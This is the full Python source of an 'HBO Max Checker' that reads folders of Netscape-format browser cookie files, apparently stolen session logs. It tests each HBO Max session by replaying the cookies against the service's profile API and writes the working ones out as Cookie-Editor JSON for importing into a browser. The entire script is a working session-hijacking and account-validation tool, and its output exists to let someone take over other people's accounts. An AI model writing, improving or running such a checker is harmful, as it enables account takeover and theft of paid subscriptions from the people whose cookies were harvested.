import os
import re
import requests
import time
import json
import base64
import signal
import sys
from datetime import datetime

live_accounts = []
count = 0

def signal_handler(sig, frame):
    print("\n\n[!] CTRL+C detected! Saving progress...")
    save_results()
    print("[!] Exiting gracefully.")
    sys.exit(0)

def generate_cookie_json(account):
    """Generate Cookie-Editor compatible JSON untuk 1 akun HBO."""
    cookies = account['cookies']
    result = []
    
    # Daftar cookie penting yang wajib dibawa
    important_cookies = [
        'st', 'session', 'wbd-profile-context', 
        'countryCode', 'usr_country', 'usr_state', 
        'one', 'transientID', 'usprivacy'
    ]
    
    for name in important_cookies:
        if cookies.get(name):
            result.append({
                "domain": ".hbomax.com",
                "name": name,
                "path": "/",
                "secure": True,
                "httpOnly": True,
                "sameSite": "Lax",
                "value": cookies[name]
            })
    return result

def save_results():
    global live_accounts, count
    if not live_accounts:
        print("[!] No live accounts to save.")
        return

    with open('hbo_live.txt', 'w', encoding='utf-8') as f:
        f.write(f"HBO MAX CHECKER - {count} LIVE\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("=" * 80 + "\n\n")

        for i, (email, plan, folder, profiles, acc) in enumerate(live_accounts, 1):
            f.write(f"[{i:3d}] {email}\n")
            f.write(f"      Plan     : {plan}\n")
            f.write(f"      Folder   : {folder}\n")
            f.write(f"      Profiles : {', '.join(profiles)}\n")
            f.write("      🍪 Cookie JSON (copy & paste ke Cookie-Editor):\n")
            
            cookie_json = generate_cookie_json(acc)
            if cookie_json:
                f.write(json.dumps(cookie_json, indent=4, ensure_ascii=False))
                f.write("\n")
            f.write("-" * 60 + "\n")

    print(f"✅ Saved: hbo_live.txt ({count} accounts)")
    print(f"\n{'=' * 60}")
    print(f"🔥 TOTAL LIVE: {count}")
    print(f"{'=' * 60}")

print(r"""
██╗  ██╗██████╗  ██████╗     ███╗   ███╗ █████╗ ██╗  ██╗
██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗╚██╗██╔╝
███████║██████╔╝██║   ██║    ██╔████╔██║███████║ ╚███╔╝ 
██╔══██║██╔══██╗██║   ██║    ██║╚██╔╝██║██╔══██║ ██╔██╗ 
██║  ██║██████╔╝╚██████╔╝    ██║ ╚═╝ ██║██║  ██║██╔╝ ██╗
╚═╝  ╚═╝╚═════╝  ╚═════╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝

            HBO Max Checker V4
            By     : Kenjisubagja / Klikajar
            Github : kenjisubagja
            FB     : R Panji Subagja
""")

signal.signal(signal.SIGINT, signal_handler)

def get_api_endpoint(st_token):
    try:
        payload = st_token.split('.')[1]
        payload += "=" * ((4 - len(payload) % 4) % 4)
        decoded = json.loads(base64.b64decode(payload).decode('utf-8'))
        
        subdivision = decoded.get("subdivision", "")
        anonymous = decoded.get("anonymous", True)
        
        if anonymous:
            return None, "Anonymous Token"
            
        if "latam" in subdivision:
            return "https://default.beam-latam.prd.api.hbomax.com/users/me/profiles", None
        elif "emea" in subdivision:
            return "https://default.beam-emea.prd.api.hbomax.com/users/me/profiles", None
        elif "apac" in subdivision:
            return "https://default.beam-apac.prd.api.hbomax.com/users/me/profiles", None
        else:
            return "https://default.any-any.prd.api.hbomax.com/users/me/profiles", None
    except Exception as e:
        return None, f"JWT Error: {str(e)[:20]}"

def parse_netscape_file(filepath, folder_name):
    cookies = {}
    metadata = {}
    email = 'Unknown'

    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if not line: continue
                
                if line.startswith('#HttpOnly_'):
                    line = line.replace('#HttpOnly_', '', 1)
                    
                if line.startswith('#'):
                    match = re.match(r'#([A-Z_ ]+)\s*:\s*(.+)', line)
                    if match:
                        key = match.group(1).strip()
                        val = match.group(2).strip()
                        metadata[key] = val
                        if key in ('EMAIL', 'USERNAME'):
                            email = val
                    continue

                parts = line.split('\t')
                if len(parts) >= 7:
                    name = parts[5].strip()
                    value = parts[6].strip()
                    cookies[name] = value
                    
    except Exception:
        return None

    return {
        'email': email,
        'plan': metadata.get('PLAN', 'Unknown'),
        'cookies': cookies,
        'folder_name': folder_name
    }

def check_hbo_account(account_data):
    cookies = account_data['cookies']
    
    if 'st' not in cookies:
        return False, "Missing 'st' cookie"

    st_token = cookies['st']
    url, err = get_api_endpoint(st_token)
    if err:
        return False, err
        
    headers = {
        'accept': '*/*',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/json',
        'origin': 'https://www.hbomax.com',
        'referer': 'https://www.hbomax.com/',
        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
        'x-disco-client': 'WEB:0.0.0:dotcom-hbomax:22.0.0',
        'x-disco-params': 'realm=bolt,bid=beam,features=ar',
        'x-wbd-time-zone': 'Asia/Jakarta',
        'x-wbd-device-consent': 'gpc=0',
        'x-wbd-preferred-language': 'en-US'
    }

    try:
        r = requests.get(url, headers=headers, cookies=cookies, timeout=15)
        
        if r.status_code == 200:
            data = r.json()
            profiles = []
            
            if isinstance(data, dict) and 'data' in data and isinstance(data['data'], list):
                for item in data['data']:
                    if isinstance(item, dict) and 'attributes' in item:
                        p_name = item['attributes'].get('profileName')
                        if p_name:
                            profiles.append(p_name)
            elif isinstance(data, list):
                for item in data:
                    if isinstance(item, dict):
                        if 'profileName' in item:
                            profiles.append(item['profileName'])
                        elif 'attributes' in item and 'profileName' in item['attributes']:
                            profiles.append(item['attributes']['profileName'])
                            
            if not profiles:
                profiles = ["No Profiles Created"]
                
            return True, profiles
        elif r.status_code == 401:
            return False, "Expired (401)"
        elif r.status_code == 400:
            return False, "Bad Request (400)"
        else:
            return False, f"HTTP {r.status_code}"
            
    except Exception as e:
        return False, "Network Error"

def read_accounts_from_folders():
    accounts = []
    for root, dirs, files in os.walk('.'):
        if 'venv' in root or '.git' in root: continue
        current_folder = os.path.basename(root)
        if current_folder == '.': current_folder = 'Root'
        
        for file in files:
            if file.endswith('.txt') and file not in ['hbo_live.txt', 'README.txt']:
                filepath = os.path.join(root, file)
                acc = parse_netscape_file(filepath, current_folder)
                if acc: accounts.append(acc)
    return accounts

def main():
    global live_accounts, count

    accounts = read_accounts_from_folders()
    
    if not accounts:
        print("\n[!] Tidak ada file .txt yang ditemukan di folder ini.")
        return

    print(f"✅ Total file .txt ditemukan: {len(accounts)}")
    print("[INFO] Press CTRL+C at any time to save progress and exit.\n")

    for i, acc in enumerate(accounts, 1):
        display_email = acc['email'][:20] if acc['email'] != 'Unknown' else "No Email Metadata"
        print(f"[{i:3d}/{len(accounts)}] [{acc['folder_name'][:15]}] {display_email:<20}...", end=' ', flush=True)
        
        is_live, profiles = check_hbo_account(acc)

        if is_live:
            count += 1
            profile_str = ", ".join(profiles)
            print(f"✅ LIVE | Profiles: {profile_str}")
            live_accounts.append((acc['email'], acc['plan'], acc['folder_name'], profiles, acc))
        else:
            print(f"❌ dead ({profiles})")

        time.sleep(1)

    print("\n" + "=" * 80)
    print(f"🔥 LIVE: {count}")

    save_results()
    print("\n🎉 DONE!")

if __name__ == "__main__":
    main()
